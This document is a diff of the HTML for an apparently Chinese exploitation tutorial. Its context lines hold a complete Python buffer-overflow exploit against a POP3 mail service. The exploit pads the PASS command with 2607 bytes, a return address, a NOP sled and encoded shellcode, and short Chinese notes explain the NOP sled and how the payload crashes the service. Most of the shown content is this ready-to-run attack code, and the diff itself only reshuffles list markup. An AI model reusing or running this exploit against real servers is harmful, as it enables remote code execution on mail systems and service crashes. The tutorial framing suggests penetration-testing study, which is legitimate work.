@@ -558,10 +558,9 @@ win32_bind    增加监听的进程，可以开启相应的端口
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x83\x61\x34&quot;+</span><br><span class="line">&quot;\x23\x83\xeb\xfc\xe2\xf4\x7f\x0b\xdf\x6e\x6b\x98\xcb\xdc\x7c\x01&quot;+</span><br><span class="line">&quot;\xbf\x4f\xa7\x45\xbf\x66\xbf\xea\x48\x26\xfb\x60\xdb\xa8\xcc\x79&quot;+</span><br><span class="line">&quot;\xbf\x7c\xa3\x60\xdf\x6a\x08\x55\xbf\x22\x6d\x50\xf4\xba\x2f\xe5&quot;+</span><br><span class="line">&quot;\xf4\x57\x84\xa0\xfe\x2e\x82\xa3\xdf\xd7\xb8\x35\x10\x0b\xf6\x84&quot;+</span><br><span class="line">&quot;\xbf\x7c\xa7\x60\xdf\x45\x08\x6d\x7f\xa8\xdc\x7d\x35\xc8\x80\x4d&quot;+</span><br><span class="line">&quot;\xbf\xaa\xef\x45\x28\x42\x40\x50\xef\x47\x08\x22\x04\xa8\xc3\x6d&quot;+</span><br><span class="line">&quot;\xbf\x53\x9f\xcc\xbf\x63\x8b\x3f\x5c\xad\xcd\x6f\xd8\x73\x7c\xb7&quot;+</span><br><span class="line">&quot;\x52\x70\xe5\x09\x07\x11\xeb\x16\x47\x11\xdc\x35\xcb\xf3\xeb\xaa&quot;+</span><br><span class="line">&quot;\xd9\xdf\xb8\x31\xcb\xf5\xdc\xe8\xd1\x45\x02\x8c\x3c\x21\xd6\x0b&quot;+</span><br><span class="line">&quot;\x36\xdc\x53\x09\xed\x2a\x76\xcc\x63\xdc\x55\x32\x67\x70\xd0\x22&quot;+</span><br><span class="line">&quot;\x67\x60\xd0\x9e\xe4\x4b\x43\xc9\x50\x4a\xe5\x09\x35\x98\xe5\x32&quot;+</span><br><span class="line">&quot;\xbd\xc2\x16\x09\xd8\xda\x29\x01\x63\xdc\x55\x0b\x24\x72\xd6\x9e&quot;+</span><br><span class="line">&quot;\xe4\x45\xe9\x05\x52\x4b\xe0\x0c\x5e\x73\xda\x48\xf8\xaa\x64\x0b&quot;+</span><br><span class="line">&quot;\x70\xaa\x61\x50\xf4\xd0\x29\xf4\xbd\xde\x7d\x23\x19\xdd\xc1\x4d&quot;+</span><br><span class="line">&quot;\xb9\x59\xbb\xca\x9f\x88\xeb\x13\xca\x90\x95\x9e\x41\x0b\x7c\xb7&quot;+</span><br><span class="line">&quot;\x6f\x74\xd1\x30\x65\x72\xe9\x60\x65\x72\xd6\x30\xcb\xf3\xeb\xcc&quot;+</span><br><span class="line">&quot;\xed\x26\x4d\x32\xcb\xf5\xe9\x9e\xcb\x14\x7c\xb1\x5c\xc4\xfa\xa7&quot;+</span><br><span class="line">&quot;\x4d\xdc\xf6\x65\xcb\xf5\x7c\x16\xc8\xdc\x53\x09\xc4\xa9\x87\x3e&quot;+</span><br><span class="line">&quot;\x67\xdc\x55\x9e\xe4\x23&quot;)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;\x90&apos;*8+shellcode</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre><ol start="11">
-<li>FUZZING</li>
-</ol>
-</blockquote>
+<pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre></blockquote>
+<ol start="11">
+<li><p>FUZZING</p>
 <ul>
 <li>早期的msfpayload<ul>
 <li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
@@ -570,8 +569,9 @@ win32_bind    增加监听的进程，可以开启相应的端口
 </ul>
 </li>
 </ul>
-<ol start="12">
-<li>FUZZING</li>
+</li>
+<li><p>FUZZING</p>
+</li>
 </ol>
 <blockquote>
 <pre><code>1.修改注册表开启远程桌面控制后需重启计算机（shutdown -r -t 0）
